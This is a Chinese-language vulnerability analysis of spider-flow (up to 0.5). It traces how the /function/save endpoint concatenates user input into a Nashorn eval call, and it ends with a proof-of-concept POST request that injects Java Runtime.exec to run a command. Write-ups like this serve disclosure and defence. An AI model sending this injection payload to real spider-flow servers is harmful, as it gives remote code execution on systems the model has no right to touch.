## 影响版本
spider-flow <=0.5
## 漏洞分析
基于POC中的路由从对应的`org/spiderflow/controller/FunctionController.java`开始跟入
```JAVA
@RestController  
@RequestMapping("/function")  
public class FunctionController {  
  
    @Autowired  
    private FunctionService functionService;  
  
...
    @RequestMapping("/save")  
    public String save(Function function){  
        return functionService.saveFunction(function);  
    }  
  
...
}
```

跟入`org/spiderflow/core/service/FunctionService.java`
```JAVA
@Service  
public class FunctionService extends ServiceImpl<FunctionMapper, Function> {  
  
    private static Logger logger = LoggerFactory.getLogger(FunctionService.class);  
	@PostConstruct  
	private void init(){  
	    try {  
	        ScriptManager.lock();  
	        ScriptManager.clearFunctions();  
	        ScriptEngine engine = ScriptManager.createEngine();  
	        super.list().forEach(function -> {  
	            ScriptManager.registerFunction(engine,function.getName(),function.getParameter(),function.getScript());  
	        });  
	        ScriptManager.setScriptEngine(engine);  
	    } finally {  
	        ScriptManager.unlock();  
	    }  
	}
    public String saveFunction(Function entity) {  
        try {  
            ScriptManager.validScript(entity.getName(),entity.getParameter(),entity.getScript());  
            super.saveOrUpdate(entity);  
            init();  
            return null;  
        } catch (Exception e) {  
            logger.error("保存自定义函数出错",e);  
            return ExceptionUtils.getStackTrace(e);  
        }  
    }  
...
}
```

进入`org/spiderflow/core/script/ScriptManager.java`

```JAVA
public static void validScript(String functionName,String parameters,String script) throws Exception {  
    new ScriptEngineManager().getEngineByName("nashorn").eval(concatScript(functionName,parameters,script));  
}
```

这里直接就使用了eval函数，跟入`concatScript`发现函数的构造是依靠拼接完成的，到这里就可以直接注入恶意代码

```JAVA
private static String concatScript(String functionName,String parameters,String script){  
    StringBuffer scriptBuffer = new StringBuffer();  
    scriptBuffer.append("function ")  
            .append(functionName)  
            .append("(")  
            .append(parameters == null ? "" : parameters)  
            .append("){")  
            .append(script)  
            .append("}");  
    return scriptBuffer.toString();  
}
```
## POC
```BURP
POST /function/save

id=&name=aaa&parameter=aaa&script=}Java.type('java.lang.Runtime').getRuntime().exec('calc');{
```